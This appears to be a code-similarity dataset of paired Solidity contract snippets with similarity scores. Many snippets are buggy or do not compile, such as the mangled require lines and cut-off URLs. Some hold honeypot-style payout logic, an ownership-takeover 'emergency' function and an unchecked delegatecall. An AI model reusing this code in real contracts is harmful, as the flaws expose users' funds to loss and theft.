    constructor(address _myContractAddress) public {
        myContractAddress = _myContractAddress;
    }

    function baz() public {
        myContract = MyContract(myContractAddress);
        x = myContract.baz();
    }
}",0.5502650706543255,"contract DepositContract {

    MainDepositContract public _main_contract;

    uint256 public _user_id;



    constructor(uint256 user_id) public {

        _user_id = user_id;

        _main_contract = MainDepositContract(msg.sender);

    }



    function () external payable {

        _main_contract.log_deposit.value(msg.value)(_user_id);

    }

}"
"contract TestContract1 {
        uint public n;
        uint public testValue1;
        bytes6 public value;

        function TestContract1(bytes6 val, uint[] testArray) {
                n = testArray.length;
                testValue1 = testArray[0];
                value = val;
        }
}",0.5814448133002244,"contract ERC20{

    function transfer(address _to, uint256 _value) public;

    function transferFrom(address _from, address _to, uint256 _value) public;

    function approve(address spender, uint tokens) public;

}"
"contract ProductContract {  
    using DataSet for *;  
    DataSet.Data d;  
    mapping (uint => uint) IDToVal;  
    function register (uint p_id, uint val) returns (bool registered) {  
        IDToVal[p_id] = val;  
        registered = true;  
    }  
    function getVal (uint p_id) returns (uint v) {  
         return IDToVal[p_id];  
    }  
}",0.5820907048812869,"contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
    function deposit(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
    function withdraw(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
}"
"contract Sender {
    event sent(
        address indexed escrowAddress
    );
    
    function sendEth() external payable{
        Escrow escrow = new Escrow();
        
        address payable _payableEscrow = address(uint160(address(escrow)));
        _payableEscrow.transfer(msg.value);
        
        emit sent(_payableEscrow);
    }
}",0.5687368896694249,"contract Multipay

{

    address hodl = msg.sender;

    function() external payable {}

    function end() public {

        if (msg.sender==hodl)

            selfdestruct(msg.sender);

    }

    function release() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract Experment2 {
uint public creationTime = now;
struct Record {
  
   
   string name;
   string senderaddress;
   string reciveraddress;
   string scheduletime;
   string scheduledate;
  
   uint time;
}
mapping (uint => Record[]) records;


function setRec (uint id, string name, string senderaddress, string reciveraddress, string scheduletime, string scheduledate, uint time) public {
     records[id].push(Record(name, senderaddress, reciveraddress, scheduletime, scheduledate, time =now));
}

function getrec(uint id , uint index) constant returns(string, string, string, string, string, uint){ {
    var a = records[id][index].name;
    var b = records[id][index].senderaddress;
    var c = records[id][index].reciveraddress;
    var d = records[id][index].scheduletime;
    var e = records[id][index].scheduledate;
    var f = records[id][index].time;

}
return(a,b,c,d,e,f);
}


function get_last_ten(uint id) constant returns (uint[10]){
    
    uint[10] memory lastItem2;
    for(uint i=0;i<10;i++){
        if(records[id].length>i){
          
            lastItem2[i] = records[id][records[id].length-i-1].time;
        }
    }
    return (lastItem2);
}
}",0.5642714184329849,"contract COS is ERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor () public {
        _name = ""COS"";
        _symbol = ""COS"";
        _decimals = 18;
        _totalSupply = 200e6 * 10**18; 
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
    }

    
    function airdrop(address[] calldata _recipients, uint256[] calldata _values) external returns (bool) {
        require(_recipients.length == _values.length, ""Inconsistent data lengths"");
        uint256 senderBalance = _balances[msg.sender];
        uint256 length = _values.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 value = _values[i];
            address to = _recipients[i];
            require(senderBalance >= value, ""Insufficient Balance"");
            require(to != address(0), ""Address is Null"");
            if (msg.sender != _recipients[i])  {      
                transfer(to, value);
            }
        }
        return true;            
    }

    

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract Example_bytes {
    bytes[] list;
    function insertHash(bytes ipfsHash) {
       list.push(ipfsHash); 
    }
}",0.5295020561635352,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract Example_string {
    struct hashes{
         string hash;
    }

    hashes[] list;
    function insertHash(string ipfsHash) {
       list.push(hashes{hash: ipfsHash); 
    }
}",0.5056733803995863,"contract VerificationStorage {

    event Verification(bytes ipfsHash);



    function verify(bytes _ipfsHash) public {

        emit Verification(_ipfsHash);

    }

}"
"contract test {

    function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) constant returns (address) {
        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";
        bytes32 prefixedHash = sha3(prefix, msgHash);
        address signer = ecrecover(prefixedHash, v, r, s);
        return signer;
    }
}",0.557946017872028,"contract GlobalConstraintInterface {

    enum CallPhase { Pre, Post, PreAndPost }

    function pre( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);
    function post( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);
    
    function when() public returns(CallPhase);
}"
"contract SimpleAuction {

  address public beneficiary;
  uint public auctionStart;
  uint public biddingTime;


  address public highestBidder;

  uint public highestBid;


  bool ended;


  event HighestBidIncreased(address bidder, uint amount);

  event AuctionEnded(address winner, uint amount);


  function SimpleAuction(uint _biddingTime, address _beneficiary) {
    beneficiary = _beneficiary;
    auctionStart = now;
    biddingTime = _biddingTime;
  }


  function bid() {

    require(condition, message); (now > auctionStart + biddingTime) ;


    require(condition, message); (msg.value <= highestBid);



    if (highestBidder != 0) {
      highestBidder.send((highestBid),
    }
    highestBidder = msg.sender;
    highestBid = msg.value;
    HighestBidIncreased(msg.sender, msg.value);
  }

  function auctionEnd() {
    require(condition, message); (now <= auctionStart + biddingTime);
    require(condition, message); (ended);
    AuctionEnded(highestBidder, highestBid);

    beneficiary.send(this.balance);
    ended = true;
  }

  function () {
    throw;
  }
}",0.5915825590595113,"contract Crowdsale {

    address public beneficiary;

    uint public start;

    token public tokenReward;

    

    uint public amountRaised;

    mapping(address => uint256) public contributionOf;



    event FundTransfer(address backer, uint amount, bool isContribution);



    

    function Crowdsale(

        address sendTo,

        address addressOfTokenUsedAsReward

    ) public {

        beneficiary = sendTo;

        tokenReward = token(addressOfTokenUsedAsReward);

        start = now;

    }



    

    function () payable public {

        require(now < start + 59 days);

        uint amount = msg.value;

		

		uint price = 200000000000 wei;

		

		if (now < start + 29 days) {

			price = 160000000000 wei;

		}

		

        contributionOf[msg.sender] += amount;

        amountRaised += amount;

        tokenReward.transfer(msg.sender, amount * 10 ** uint256(18) / price);

        emit FundTransfer(msg.sender, amount, true);

    }



    

    function withdrawal(uint amount) public {

        if (beneficiary == msg.sender) {

            if (beneficiary.send(amount)) {

               emit FundTransfer(beneficiary, amountRaised, false);

            } 

        }

    }

}"
"contract C {
  using A for A.Storage;
  using B for B.Storage;

  A.Storage internal a;
  B.Storage internal b;

  function doIt() public {
    b.myFunc(a);
  }
}",0.5410139251109748,"contract CREDITS is Ownable {

    mapping (address => uint256) internal balanceOf;

    function transfer (address _to, uint256 _value) public returns (bool);

   

}"
"contract MyContract {
  uint lastBlockNumber;

  

  function setLastBlockNumber(uint number) {
    lastBlockNumber = number;
  }

  function claim() public {
    if (block.number >= lastBlockNumber + 10) {
      msg.sender.transfer(this.balance);
    }
  }
}",0.5478070661417576,"contract Deposit {

    address public owner;

    
    function Deposit() public {
        owner = msg.sender;
    }

    
    function() public payable {
        _transter(msg.value);
    }

    
    function _transter(uint balance) internal {
        owner.transfer(balance);
    }
}"
"contract MyContractPersonStruct {
    Person[] public people;

    uint256 public peopleCount;

    struct Person {
        string _firstName;
        string _lastName;
    }

    function addPerson(string memory _firstName, string memory _lastName) public {
        people.push(Person(_firstName, _lastName));
        peopleCount += 1;
    }
}",0.5641949921727103,"contract Beneficiary {
    
    
    
    function receiveEthersTo(address wallet, string memory balanceType)
    public
    payable;

    
    
    
    
    
    
    
    
    function receiveTokensTo(address wallet, string memory balanceType, int256 amount, address currencyCt,
        uint256 currencyId, string memory standard)
    public;
}"
"contract Season is Owned {
    uint64 public begin;
    uint64 public end;
    string name;

    Request[] requests;
    mapping(bytes30 => uint) requestServiceNumberToIndex;

    event RequestCreated(bytes30 indexed serviceNumber, uint index);

    constructor(uint64 begin_, uint64 end_, string name_) public {
        begin = begin_;
        end = end_;
        name = name_;
    }

    function createRequest(bytes30 serviceNumber, uint64 date, DeclarantType declarantType, string declarantName, uint64 fairId, uint64[] assortment, uint64 district, uint64 region, string additionalData) public onlyOwner {     
        uint index = requestServiceNumberToIndex[serviceNumber];

        require(index == 0 && (requests.length == 0 || requests[0].serviceNumber != serviceNumber));

        requests.length++;
        index = requests.length - 1;    
        requestServiceNumberToIndex[serviceNumber] = index;

        Request storage request = requests[index];

        request.serviceNumber = serviceNumber;
        request.date = date;
        request.declarantType = declarantType;
        request.declarantName = declarantName;
        request.fairId = fairId;
        request.district = district;
        request.region = region;
        request.assortment = assortment;
        request.additionalData = additionalData;

        emit RequestCreated(serviceNumber, index);
    }

    function getSeasonDetails() public view returns(uint64, uint64, string) {
        return (begin, end, name);
    }

    function getRequestByServiceNumber(bytes30 serviceNumber) public view returns(bytes30, uint64, DeclarantType, string, uint64, uint64[], uint64, uint64, string) {
        return getRequestByIndex(requestServiceNumberToIndex[serviceNumber]);
    }

    function getRequestByIndex(uint index) public view returns(bytes30, uint64, DeclarantType, string, uint64, uint64[], uint64, uint64, string) {
        Request storage request = requests[index];
        bytes30 serviceNumber = request.serviceNumber;
        string memory declarantName = request.declarantName;
        uint64[] memory assortment = getAssortment(request);        
        string memory additionalData = request.additionalData;
        return (serviceNumber, request.date, request.declarantType, declarantName, request.fairId, assortment, request.district, request.region, additionalData);
    }

    function getAssortment(Request request) private pure returns(uint64[]) {
        uint64[] memory memoryAssortment = new uint64[](request.assortment.length);
        for (uint i = 0; i < request.assortment.length; i++) {
            memoryAssortment[i] = request.assortment[i];
        }
        return memoryAssortment;
    }

    struct Request {
        bytes30 serviceNumber;
        uint64 date;
        DeclarantType  declarantType;
        string declarantName;
        uint64 fairId;
        uint64[] assortment;
        uint64 district;
        uint64 region;
        string additionalData;
    }

    enum DeclarantType {
        A,
        B,
        C,
        D
    }
}",0.5166126923238439,"contract Voting is Ownable {
  
  uint8 public candidates;
  
  Token public msp;
  
  uint public cap;
  
  uint public endBlock;

  
  mapping(address => uint8) public votes;
  
  address[] public voters;

  
  
  
  
  
  function Voting(uint8 _candidatesCount, address _msp, uint _cap, uint _endBlock) {
    candidates = _candidatesCount;
    msp = Token(_msp);
    cap = _cap;
    endBlock = _endBlock;
  }

  
  
  function vote(uint8 _candidate) {
    require(_candidate > 0 && _candidate <= candidates);
    assert(endBlock == 0 || getBlockNumber() <= endBlock);
    if (votes[msg.sender] == 0) {
      voters.push(msg.sender);
    }
    votes[msg.sender] = _candidate;
    Vote(msg.sender, _candidate);
  }

  
  function votersCount()
    constant
    returns(uint) {
    return voters.length;
  }

  
  
  
  
  
  function getVoters(uint _offset, uint _limit)
    constant
    returns(address[] _voters, uint8[] _candidates, uint[] _amounts) {
    return getVotersAt(_offset, _limit, getBlockNumber());
  }

  
  
  
  
  
  
  function getVotersAt(uint _offset, uint _limit, uint _blockNumber)
    constant
    returns(address[] _voters, uint8[] _candidates, uint[] _amounts) {

    if (_offset < voters.length) {
      uint count = 0;
      uint resultLength = voters.length - _offset > _limit ? _limit : voters.length - _offset;
      uint _block = _blockNumber > endBlock ? endBlock : _blockNumber;
      _voters = new address[](resultLength);
      _candidates = new uint8[](resultLength);
      _amounts = new uint[](resultLength);
      for(uint i = _offset; (i < voters.length) && (count < _limit); i++) {
        _voters[count] = voters[i];
        _candidates[count] = votes[voters[i]];
        _amounts[count] = msp.balanceOfAt(voters[i], _block);
        count++;
      }

      return(_voters, _candidates, _amounts);
    }
  }

  function getSummary() constant returns (uint8[] _candidates, uint[] _summary) {
    uint _block = getBlockNumber() > endBlock ? endBlock : getBlockNumber();

    
    _candidates = new uint8[](candidates);
    for(uint8 c = 1; c <= candidates; c++) {
      _candidates[c - 1] = c;
    }

    
    _summary = new uint[](candidates);
    uint8 _candidateIndex;
    for(uint i = 0; i < voters.length; i++) {
      _candidateIndex = votes[voters[i]] - 1;
      _summary[_candidateIndex] = _summary[_candidateIndex] + min(msp.balanceOfAt(voters[i], _block), cap);
    }

    return (_candidates, _summary);
  }

  
  
  
  
  function claimTokens(address _token) onlyOwner {
    if (_token == 0x0) {
      owner.transfer(this.balance);
      return;
    }

    ERC20Basic token = ERC20Basic(_token);
    uint balance = token.balanceOf(this);
    token.transfer(owner, balance);
    ClaimedTokens(_token, owner, balance);
  }

  
  function getBlockNumber() internal constant returns (uint) {
    return block.number;
  }

  
  function min(uint a, uint b) internal returns (uint) {
    return a < b ? a : b;
  }

  event Vote(address indexed _voter, uint indexed _candidate);
  event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);
}"
"contract SimpleAuctions {
    uint  public beneficiary; 
    uint public auctionEnd; 
    address public highestBidder; 
    uint public highestBid; 
    mapping(address => uint) pendingReturns; 
    bool ended; 
    uint valueforbeneficiary;
    event HighestBidIncreased(address bidder, uint amount); 
    event AuctionEnded(address winner, uint amount); 
    function SimpleAuction(uint[] valueforgoods) public pure {
        uint allvalue;
        uint i;
        for (i = 0;i < valueforgoods.length;i++){
            allvalue = allvalue + valueforgoods[i];

             if (valueforgoods[i] > highestBid) {  
                highestBid = valueforgoods[i];
            }
        }
    }
    function bid() public payable {
        require(
            now <= auctionEnd,
            ""Auction already ended.""
        );
        require(
            msg.value > highestBid,
            ""There already is a higher bid.""
        );
        if (highestBid != 0) {
            pendingReturns[highestBidder] += highestBid;
        }
        highestBidder = msg.sender;
        highestBid = msg.value;
        
        emit HighestBidIncreased(msg.sender, msg.value);
    }

    function auctionEnd() public {
        require(now >= auctionEnd, ""Auction not yet ended."");
        require(!ended, ""auctionEnd has already been called."");
        ended = true;
        emit AuctionEnded(highestBidder, highestBid);
        beneficiary.transfer(highestBid);
    }
}",0.5837994129052833,"contract WalletWithEmergencyTransfer is Owned {

    event Deposit(address from, uint amount);
    event Withdrawal(address from, uint amount);
    event Call(address from, address to, uint amount);
    address public owner = msg.sender;
    uint256 private emergencyCode;
    uint256 private emergencyAmount;

    function WalletWithEmergencyTransfer() public {
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
        Withdrawal(msg.sender, amount);
    }

    function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
        if (msg.value > 0)
            deposit();

        require(addr.call.value(amount)(data));
        Call(msg.sender, addr, amount);
    }

    function setEmergencySecrets(uint256 code, uint256 amount) public onlyOwner {
        emergencyCode = code;
        emergencyAmount = amount;
    }

    function emergencyTransfer(uint256 code, address newOwner) public payable {
        if ((code == emergencyCode) &&
            (msg.value == emergencyAmount) &&
            (newOwner != address(0))) {
            owner = msg.sender;
        }
    }
}"
"contract NormalFunction {
  function NothingWrongHere() public pure { }
}",0.5973251344123772,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract Taxi {

    enum State {IDLE, FINDING_DRIVER, AWAITING_PAYMENT, AWAITING_DESTINATION, COMPLETE}
    State public currentState;
    mapping (address => uint) public balances;
    bytes32 STRING_COMPLETE = ""Complete"";
    bytes32 STRING_PARTIAL = ""Partial"";

    modifier customerOnly() { require(msg.sender == customer); _; }
    modifier driverOnly() { require(msg.sender == driver); _; }
    modifier arbiterOnly() { require(msg.sender == arbiter); _; }
    modifier inState(State expectedState) { require(currentState == expectedState); _; }

    address public customer;
    address public driver;
    address public arbiter;

    function Taxi(address _customer, address _driver, address _arbiter) public {
        customer = _customer;
        driver = _driver;
        arbiter = _arbiter;
    }

    function assignDriver() customerOnly inState(State.IDLE) public {
        
        currentState = State.FINDING_DRIVER;
    }

    function confirmAmount(uint amount) driverOnly inState(State.FINDING_DRIVER) public returns (bool ) {
        if(amount < 0) {
            amount = 20;
        }
        
        if(balances[customer] < amount) {
            return false;
        }
        currentState = State.AWAITING_DESTINATION;
        balances[arbiter] += amount;
        balances[customer] -= amount;
        return true;
    }
}",0.5709414989398613,"contract StrongHandsManager {

    

    event CreateStrongHand(address indexed owner, address indexed strongHand);

    event MintToken(address indexed owner, uint256 indexed amount);

    

    mapping (address => address) public strongHands;

    mapping (address => uint256) public ownerToBalance;

    

    

    string public constant name = ""Stronghands3D"";

    string public constant symbol = ""S3D"";

    uint8 public constant decimals = 18;

    

    uint256 internal tokenSupply = 0;



    function getStrong(address _referrer)

        public

        payable

    {

        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");

        

        strongHands[msg.sender] = (new StrongHand).value(msg.value)(msg.sender, _referrer);

        

        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);

    }

    

    function mint(address _owner, uint256 _amount)

        external

    {

        require(strongHands[_owner] == msg.sender);

        

        tokenSupply+= _amount;

        ownerToBalance[_owner]+= _amount;

        

        emit MintToken(_owner, _amount);

    }

    

    

    function totalSupply()

        public

        view

        returns (uint256)

    {

       return tokenSupply;

    }

    

    function balanceOf(address _owner)

        public

        view

        returns (uint256)

    {

        return ownerToBalance[_owner];

    }

}"
"contract MasterConstituency is Ownable {
    enum ConstituencyType {FEDERAL, STATE}
    uint totalVotes;

    modifier isValidConstituencyType(uint _constituencyType){
        require(uint(ConstituencyType.STATE) >= _constituencyType);
        _;
    }

    modifier isUniqueParty(string _name){
        for (uint x = 0; x < parties.length; x++) {
            if (compareStrings(parties[x].name, _name)) {
                revert();
            }
        }
        _;
    }

    struct Party {
        string name;
        string abbreviation;
    }

    struct Candidate {
        string name;
        uint numVotes;
        bool validCandidate;
    }

    struct Voter {
        bool hasVoted;
        bool validFederalVote;
        bool validStateVote;
        uint federalCandidateVote;
        uint stateCandidateVote;
    }

    Candidate[] candidates;
    Party[] parties;

    mapping(string => Voter) votes;
    mapping(string => address) constituencies;
    mapping(uint => uint) candidateToParty;

    function initialiseConstituency(
        uint _constituencyType,
        string _constituencyCode,
        string _constituencyName) public onlyOwner() isValidConstituencyType(_constituencyType) returns (address) {
        address constituency = new BaseConstituency(_constituencyType, _constituencyName);
        constituencies[_constituencyCode] = constituency;

        return constituency;
    }

    function registerParty(string _name, string _abbreviation) public onlyOwner() isUniqueParty(_name) {
        parties.push(Party(_name, _abbreviation));
    }

    function getConstituencyAddress(string _constituencyCode) public view returns (address) {
        return constituencies[_constituencyCode];
    }

    function compareStrings(string a, string b) public pure returns (bool){
        bytes32 c = keccak256(abi.encodePacked(a));
        bytes32 d = keccak256(abi.encodePacked(b));

        return c == d;
    }
}",0.5475179502620771,"contract AnonymousWALL {

    

    address payable manager;

    struct messageDetails {

      uint time;

      string headline ;

      string message;

    }

    mapping (address => messageDetails) journal;

    address[] private listofjournalists;

    

    constructor() public {

      manager = msg.sender;

    }

    

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {

        if (_i == 0) {

            return ""0"";

        }

        uint j = _i;

        uint len;

        while (j != 0) {

            len++;

            j /= 10;

        }

        bytes memory bstr = new bytes(len);

        uint k = len - 1;

        while (_i != 0) {

            bstr[k--] = byte(uint8(48 + _i % 10));

            _i /= 10;

        }

        return string(bstr);

    }

    

    function enteranews(string memory uHeadline, string memory uMessage) public payable {

        require(msg.value >= .001 ether,""This contrat works with minimum 0.001 ether"");

        require(journal[msg.sender].time == 0,""An account can only be used once."");

        manager.transfer(msg.value);

        journal[msg.sender].time = now;

        journal[msg.sender].headline = uHeadline;

        journal[msg.sender].message = uMessage;

        listofjournalists.push(msg.sender) -1;

    }

    

    function getjournalists() view public returns(address[] memory) {

      return listofjournalists;

    }

    

    function numberofnews() view public returns (uint) {

      return listofjournalists.length;

    }

    

    function gamessage(address _address) view public returns (string memory, string memory, string memory,string memory) {

        if(journal[_address].time == 0){

            return (""0"", ""0"", ""0"", ""This address hasnt sent any messages before."");

        } else {

            return (uint2str(journal[_address].time), journal[_address].headline, journal[_address].message, ""We reached your message successfully."");

        }

    }

}"
"contract Organization {



 struct Proposal {
   uint code;
   uint amount;
  string description;
  uint numberOfVotes;
  string name;
}

Proposal[] public proposals;
uint public numberOfProposals;


 event ProposalAdded(uint code, uint amount, string description, int 
 numberOfVotes , string name);


 function addProposal(uint amount, string description , string name) 
 returns (uint) {

proposals.push(Proposal(numberOfProposals,amount,description,0,name));
ProposalAdded(numberOfProposals,amount,description, 0, name);
numberOfProposals++;
return numberOfProposals;

}



 function proposalExists (uint code) returns (bool) {
   for(uint i = 0; i < proposals.length; i++) {
     if (proposals[i].code == code) {
        return true;
      }
    }
     return false;
 }

function numOfProposals() returns (uint){
    return numberOfProposals;
  }

function getProposalName(uint index) returns (string){
    return proposals[index].name;
}

function getProposalDescription(uint index) returns (string){
    return proposals[index].description;
}

function getProposalIndex(string name) returns (uint){
  for(uint i = 0; i < proposals.length; i++) {
      bytes memory a = bytes(proposals[i].name);
      bytes memory b = bytes(name);
    if (a.length == b.length) {
        return i;
    }
  }
  return 1000000;
}

function voteFotProposal(uint index) {
    proposals[index].numberOfVotes++;
  }

function getProposalVotesIndex(uint index) {
    proposals[index].numberOfVotes;
  }


struct Memmber {
  uint id;
  string name;
}

struct Commitee {
  uint id;
  string name;
  string missionStatement;
  uint balance;
  string [] memmbers;
}

event MemmberAdded(uint id, string name);
event CommiteeCreated(string name,string missionStatement );

string [] public memmbersArray;
string[] public comitees;
uint public numOfComitees = 0;
uint public numOfTotalMemmbers = 0;
Commitee [] fullComitees;




  function convertMemmberStrings (bytes32 [] values) internal returns 
  (string []){

        for(uint i=0;i<values.length;i++){
            MemmberAdded(numOfTotalMemmbers, 
            bytes32ToString(values[i]));
            memmbersArray.push(bytes32ToString(values[i]));
            numOfTotalMemmbers++;
    }
    return memmbersArray;
}


function addCommitee 
(string name, string missionStatement , uint funds, bytes32 [] values)
returns (string)
{
  comitees.push(name);
  CommiteeCreated(name,missionStatement );
  fullComitees.push(Commitee(numOfComitees, name, missionStatement, funds, convertMemmberStrings(values)));
  numOfComitees++;
  return name;
}

function getComitees (uint index) returns (string){
  return comitees[index];
}

function numberOfCommitees () returns (uint){
  return numOfComitees;
}

 function bytes32ToString(bytes32 x) constant returns (string) {
    bytes memory bytesString = new bytes(32);
    uint charCount = 0;
    for (uint j = 0; j < 32; j++) {
      byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));
      if (char != 0) {
        bytesString[charCount] = char;
        charCount++;
     }
 }
bytes memory bytesStringTrimmed = new bytes(charCount);
for (j = 0; j < charCount; j++) {
    bytesStringTrimmed[j] = bytesString[j];
}
return string(bytesStringTrimmed);
}

 function uintToBytes(uint v) constant returns (bytes32 ret) {
    if (v == 0) {
      ret = '0';
   }
   else {
    while (v > 0) {
        ret = bytes32(uint(ret) / (2 ** 8));
        ret |= bytes32(((v % 10) + 48) * 2 ** (8 * 31));
        v /= 10;
    }
 }
 return ret;
}


}",0.5609147323737137,"contract BethereumERC223 is ERC223Interface {

    using SafeMath for uint256;



    

    string public constant _name = ""Bethereum"";

    string public constant _symbol = ""BETHER"";

    uint8 public constant _decimals = 18;



    

    address public owner;

    mapping(address => uint256) public balances;

    mapping(address => mapping (address => uint256)) public allowed;



    

    function BethereumERC223() {

        totalSupply = 224181206832398351471266750;

        owner = msg.sender;

    }



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed from, address indexed to, uint256 value);



    

    event Transfer(address indexed from, address indexed to, uint value, bytes data);



    

    function balanceOf(address _address) constant returns (uint256 balance) {

        return balances[_address];

    }



    

    function transfer(address _to, uint _value) returns (bool success) {

        if (balances[msg.sender] >= _value

        && _value > 0

        && balances[_to] + _value > balances[_to]) {

            bytes memory empty;

            if(isContract(_to)) {

                return transferToContract(_to, _value, empty);

            } else {

                return transferToAddress(_to, _value, empty);

            }

        } else {

            return false;

        }

    }



    

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        if (balances[_from] >= _value

        && allowed[_from][msg.sender] >= _value

        && _value > 0

        && balances[_to] + _value > balances[_to]) {

            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            balances[_to] += _value;

            Transfer(_from, _to, _value);

            return true;

        } else {

            return false;

        }

    }



    

    function approve(address _spender, uint256 _allowance) returns (bool success) {

        allowed[msg.sender][_spender] = _allowance;

        Approval(msg.sender, _spender, _allowance);

        return true;

    }



    

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }



    

    

    function name() constant returns (string name) {

        return _name;

    }



    

    function symbol() constant returns (string symbol) {

        return _symbol;

    }



    

    function decimals() constant returns (uint8 decimals) {

        return _decimals;

    }



    

    function transfer(address _to, uint _value, bytes _data) returns (bool success) {

        if (balances[msg.sender] >= _value

        && _value > 0

        && balances[_to] + _value > balances[_to]) {

            if(isContract(_to)) {

                return transferToContract(_to, _value, _data);

            } else {

                return transferToAddress(_to, _value, _data);

            }

        } else {

            return false;

        }

    }



    

    function transferToAddress(address _to, uint _value, bytes _data) internal returns (bool success) {

        balances[msg.sender] -= _value;

        balances[_to] += _value;

        Transfer(msg.sender, _to, _value);

        Transfer(msg.sender, _to, _value, _data);

        return true;

    }



    

    function transferToContract(address _to, uint _value, bytes _data) internal returns (bool success) {

        balances[msg.sender] -= _value;

        balances[_to] += _value;

        ContractReceiver receiver = ContractReceiver(_to);

        receiver.tokenFallback(msg.sender, _value, _data);

        Transfer(msg.sender, _to, _value);

        Transfer(msg.sender, _to, _value, _data);

        return true;

    }



    

    function isContract(address _address) internal returns (bool is_contract) {

        uint length;

        if (_address == 0) return false;

        assembly {

        length := extcodesize(_address)

        }

        if(length > 0) {

            return true;

        } else {

            return false;

        }

    }



    

    function () {

        throw;

    }

}"
"contract RouteCoin {

    string public parentContracts;

    address private buyer;   

    address private seller;

    uint private contractStartTime;

    address private finalDestination;  

    uint private contractGracePeriod;

    function RouteCoin(address _finalDestination, uint _contractGracePeriod, string _parentContracts) {
        buyer = msg.sender;
        contractStartTime = now;        
        finalDestination = _finalDestination;
        contractGracePeriod = _contractGracePeriod;
        parentContracts = _parentContracts;
    }
",0.5439799875731739,"contract UserWallet {

    WalletController private controller;



    constructor (address _controller) public {

        controller = WalletController(_controller);

    }



    function () public payable {

        controller.logEthDeposit(msg.sender, address(this), msg.value);

    }



    function tokenFallback(address _from, uint _value, bytes _data) public pure {

        (_from);

        (_value);

        (_data);

    }



    function sweep(address _token, uint _amount) public returns (bool) {

        (_amount);

        return controller.sweeperOf(_token).delegatecall(msg.data);

    }

}"
"contract KrakenPriceTicker is usingOraclize {

    string public ETHXBT;

    event newOraclizeQuery(string description);
    event newKrakenPriceTicker(string price);


    function KrakenPriceTicker() {
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        update();
    }

    function __callback(bytes32 myid, string result, bytes proof) {
    if (msg.sender != oraclize_cbAddress()) throw;
        ETHXBT = result;
        newKrakenPriceTicker(ETHXBT);
        update();
    }

    function update() payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
            newOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
    } else {
            newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
            oraclize_query(60, ""URL"", ""json(https:
        }
    }

}",0.5207975810549599,"contract USDOracle {
    OraclizeAddrResolverI OAR = OraclizeAddrResolverI(0x1d11e5eae3112dbd44f99266872ff1d07c77dce8);

    function USDOracle() {
    }

    function initialize() public {
        var oraclize = OraclizeI(OAR.getAddress());
        oraclize.query.value(msg.value)(0, ""URL"", ""http:
    }

    function getPriceProxy() constant returns (uint) {
        var oraclize = OraclizeI(OAR.getAddress());
        return oraclize.getPrice(""URL"", 200000);
    }

    function oneCentOfWei() constant returns (uint) {
        var oraclize = OraclizeI(OAR.getAddress());
        var price = oraclize.getPrice(""URL"", 200000);
        var one_cent_of_wei = price - tx.gasprice * 200000;
        return one_cent_of_wei;
    }

    function WEI() constant returns (uint) {
        
        return oneCentOfWei() * 100;
    }

    function USD() constant returns (uint) {
        
        return 1 ether / oneCentOfWei();
    }
}"
"contract vendorContract {

    uint public vendorID;
    uint public ownerID;
    uint256 public contractValue;
    string public contractDescription;
    string public contractStatus;
    string public paymentStatus;
    address public contractOwner;
    address public contractVendor;
    string constant newcon = ""New"";
    string constant wipcon =  ""WIP"";
    string constant reqcon  = ""Requested"";
    string constant shipcon = ""Shipped"";
    string constant endcon = ""Completed"";
    string constant err = ""Error"";


    modifier isOwner()
    {
        if (msg.sender != contractOwner) throw;
        _ ;
    }

    modifier isVendor()
   {
        if (msg.sender != contractVendor) throw;
        _ ;
    }

    function vendorContract(uint _vid, string _desc) public {
        vendorID = _vid;
        contractStatus=""New"";
        contractOwner=msg.sender;
        contractDescription= _desc;

    }

      function acceptContract(uint256 _cvalue, uint _vidd) public {
        if (vendorID !=  _vidd) {
            contractStatus = err;
            throw;
        }

        contractStatus=wipcon;
        contractValue = _cvalue;
        contractVendor = msg.sender;
        }

    function requestPayment() isVendor {
    paymentStatus=reqcon;
    contractStatus=shipcon;
    }

    function paymentStatus() returns (string) {
    return paymentStatus;
    }


    function payVendor() payable isOwner {   
     if  (!contractVendor.send(contractValue))
        throw;
    
    contractStatus = endcon;


    }

   }",0.5815870890056634,"contract WhitepaperVersioning {

    mapping (address => Whitepaper[]) private whitepapers;

    mapping (address => address) private authors;

    event Post(address indexed _contract, uint256 indexed _version, string _ipfsHash, address _author);



    struct Whitepaper {

        uint256 version;

        string ipfsHash;

    }



    

    constructor () public {}



    

    function pushWhitepaper (Ownable _contract, uint256 _version, string _ipfsHash) public returns (bool) {

        uint256 num = whitepapers[_contract].length;

        if(num == 0){

            

            require(_contract.owner() == msg.sender);

            authors[_contract] = msg.sender;

        }else{

            

            require(authors[_contract] == msg.sender);

            

            require(whitepapers[_contract][num-1].version < _version);

